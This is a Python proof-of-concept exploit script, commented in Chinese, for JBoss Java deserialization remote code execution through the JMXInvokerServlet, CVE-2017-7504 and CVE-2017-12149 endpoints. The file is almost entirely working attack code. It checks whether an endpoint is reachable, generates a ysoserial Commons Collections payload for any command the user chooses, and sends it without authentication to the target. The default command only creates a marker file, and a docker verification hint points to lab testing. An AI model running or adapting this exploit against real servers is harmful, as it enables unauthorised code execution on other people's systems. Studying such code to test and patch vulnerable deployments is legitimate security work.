#!/usr/bin/env python3
"""
JBoss JMXInvokerServlet 反序列化远程代码执行漏洞 POC
漏洞: JMXInvokerServlet-deserialization (无CVE编号)
漏洞等级: 严重

==================== 漏洞描述 ====================
【漏洞原理】
JBoss AS 6.x在/invoker/JMXInvokerServlet请求中直接反序列化用户提交的对象，
攻击者可利用Apache Commons Collections利用链实现远程代码执行。

【影响范围】
- JBoss AS 4.x - 6.x
- 端口: 8080

【危害等级】
- 无需认证
- 需要ysoserial生成payload

【参考链接】
- https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/

==================== 环境要求 ====================
- Python 3.6+
- requests库
- ysoserial

==================== 验证步骤 ====================
1. 基础检测:
   python jboss_jmxinvoker_deser.py http://target:8080 --check-only

2. 利用:
   python jboss_jmxinvoker_deser.py http://target:8080 -c "touch /tmp/success"
"""

import sys
import os
import json
import subprocess
import argparse
import requests
from typing import Dict, Optional
from urllib.parse import urljoin


class JBossDeserPOC:
    VULN_NAME = "JBoss JMXInvokerServlet Deserialization RCE"
    CVE_ID = "N/A"
    SEVERITY = "严重"
    AFFECTED = "JBoss AS 4.x - 6.x"
    ENDPOINT = "/invoker/JMXInvokerServlet"

    def __init__(self, target, timeout=15, proxy=None, verify_ssl=False):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.proxy = proxy
        self.verify_ssl = verify_ssl

    def _create_session(self):
        session = requests.Session()
        session.verify = self.verify_ssl
        if self.proxy:
            session.proxies = {"http": self.proxy, "https": self.proxy}
        if not self.verify_ssl:
            requests.packages.urllib3.disable_warnings()
        return session

    def _generate_payload(self, command, gadget="CommonsCollections5"):
        yso_paths = ["ysoserial.jar", "ysoserial-0.0.6-SNAPSHOT-all.jar",
                      "/usr/local/bin/ysoserial.jar"]
        jar = next((p for p in yso_paths if os.path.isfile(p)), None)
        if not jar:
            return None
        try:
            r = subprocess.run(["java", "-jar", jar, gadget, command],
                              capture_output=True, timeout=30)
            return r.stdout if r.returncode == 0 and r.stdout else None
        except Exception:
            return None

    def check(self):
        result = {"vulnerability": f"{self.VULN_NAME} ({self.CVE_ID})",
                  "target": self.target, "status": "unknown",
                  "details": [], "conclusion": ""}
        session = self._create_session()

        print("[*] 检测JBoss服务...")
        try:
            resp = session.get(self.target, timeout=self.timeout)
            result["details"].append(f"HTTP {resp.status_code}")
            print(f"[*] HTTP {resp.status_code}")
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"不可达: {e}"
            return result

        url = urljoin(self.target, self.ENDPOINT)
        try:
            resp = session.post(url, data=b"test", timeout=self.timeout)
            result["details"].append(f"{self.ENDPOINT}: HTTP {resp.status_code}")
            if resp.status_code != 404:
                print(f"[+] {self.ENDPOINT} 可用")
                result["status"] = "vulnerable"
                result["conclusion"] = (
                    f"端点可用。利用: python {sys.argv[0]} "
                    f"{self.target} -c \"touch /tmp/success\""
                )
            else:
                result["status"] = "not_vulnerable"
                result["conclusion"] = "端点不存在"
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"异常: {e}"
        return result

    def exploit(self, command="touch /tmp/success", payload_file="", gadget="CommonsCollections5"):
        result = {"vulnerability": f"{self.VULN_NAME} ({self.CVE_ID})",
                  "target": self.target, "command": command,
                  "status": "unknown", "details": [], "output": "", "conclusion": ""}
        session = self._create_session()

        payload = None
        if payload_file:
            try:
                with open(payload_file, "rb") as f:
                    payload = f.read()
                print(f"[+] 读取payload: {payload_file} ({len(payload)}B)")
            except Exception as e:
                result["status"] = "error"
                result["conclusion"] = f"读取失败: {e}"
                return result
        else:
            print(f"[*] 用ysoserial {gadget} 生成payload...")
            payload = self._generate_payload(command, gadget)
            if payload:
                print(f"[+] 生成payload ({len(payload)}B)")
            else:
                result["status"] = "failed"
                result["conclusion"] = (
                    f"未找到ysoserial.\n手动生成:\n"
                    f"  java -jar ysoserial.jar {gadget} "
                    f"\"{command}\" > payload.ser\n"
                    f"  python {sys.argv[0]} {self.target} --payload payload.ser"
                )
                return result

        url = urljoin(self.target, self.ENDPOINT)
        print(f"[*] POST payload到 {self.ENDPOINT}...")
        try:
            resp = session.post(url, data=payload, timeout=self.timeout,
                               headers={"Content-Type": "application/octet-stream"})
            result["http_status"] = resp.status_code
            result["details"].append(f"HTTP {resp.status_code}")
            result["status"] = "suspected_exploited"
            result["conclusion"] = (
                "Payload已发送。验证:\n"
                "  docker compose exec jboss ls -la /tmp/success"
            )
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"异常: {e}"
        return result

    def run(self, command="", payload_file="", gadget="CommonsCollections5"):
        print(f"[*] {self.VULN_NAME} ({self.CVE_ID})")
        print(f"[*] 目标: {self.target}, 等级: {self.SEVERITY}")
        print("-" * 60)
        if command or payload_file:
            return self.exploit(command, payload_file, gadget)
        return self.check()

    def print_result(self, result):
        status = result.get("status", "unknown")
        icons = {"exploited": "[+]", "vulnerable": "[+]",
                 "suspected_exploited": "[?]",
                 "failed": "[-]", "not_vulnerable": "[-]", "error": "[!]"}
        icon = icons.get(status, "[-]")
        print(f"\n{'=' * 60}")
        print(f"{icon} {result['vulnerability']}")
        print(f"    目标: {result['target']}, 状态: {status}")
        if result.get("command"):
            print(f"    命令: {result['command']}")
        for d in result.get("details", []):
            print(f"    {d}")
        print(f"    结论: {result.get('conclusion', '')}")
        print(f"{'=' * 60}")


class CVE20177504POC(JBossDeserPOC):
    VULN_NAME = "JBoss JMS Deserialization RCE"
    CVE_ID = "CVE-2017-7504"
    AFFECTED = "JBoss AS 4.x"
    ENDPOINT = "/jbossmq-httpil/HTTPServerILServlet"

    def __init__(self, target, timeout=15, proxy=None, verify_ssl=False):
        super().__init__(target, timeout, proxy, verify_ssl)


class CVE201712149POC(JBossDeserPOC):
    VULN_NAME = "JBoss HttpInvoker Deserialization RCE"
    CVE_ID = "CVE-2017-12149"
    AFFECTED = "JBoss AS 5.x/6.x"
    ENDPOINT = "/invoker/readonly"

    def __init__(self, target, timeout=15, proxy=None, verify_ssl=False):
        super().__init__(target, timeout, proxy, verify_ssl)


def main():
    parser = argparse.ArgumentParser(
        description="JBoss 反序列化RCE POC (3个端点)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
端点说明:
  --jmx     /invoker/JMXInvokerServlet     (JMXInvokerServlet)
  --jms     /jbossmq-httpil/HTTPServerILServlet (CVE-2017-7504)
  --http    /invoker/readonly               (CVE-2017-12149)

使用示例:
  python jboss_jmxinvoker_deser.py http://target:8080 --check-only --jmx
  python jboss_jmxinvoker_deser.py http://target:8080 -c "touch /tmp/success" --jmx
  python jboss_jmxinvoker_deser.py http://target:8080 -c "touch /tmp/success" --jms
        """
    )
    parser.add_argument("target")
    parser.add_argument("--check-only", action="store_true")
    parser.add_argument("-c", "--command", default="")
    parser.add_argument("--payload", default="", help="payload文件")
    parser.add_argument("--jmx", action="store_true", help="JMXInvokerServlet端点")
    parser.add_argument("--jms", action="store_true", help="CVE-2017-7504 JMS端点")
    parser.add_argument("--http", action="store_true", help="CVE-2017-12149 HttpInvoker端点")
    parser.add_argument("-g", "--gadget", default="CommonsCollections5", help="ysoserial gadget")
    parser.add_argument("-t", "--timeout", type=int, default=15)
    parser.add_argument("-k", "--insecure", action="store_true")
    parser.add_argument("--output", choices=["text", "json"], default="text")
    args = parser.parse_args()

    if args.jms:
        cls = CVE20177504POC
    elif args.http:
        cls = CVE201712149POC
    else:
        cls = JBossDeserPOC

    poc = cls(
        target=args.target, timeout=args.timeout,
        verify_ssl=not args.insecure
    )

    if args.check_only:
        result = poc.check()
    elif args.command or args.payload:
        result = poc.run(args.command, args.payload, args.gadget)
    else:
        result = poc.check()

    if args.output == "json":
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        poc.print_result(result)


if __name__ == "__main__":
    main()
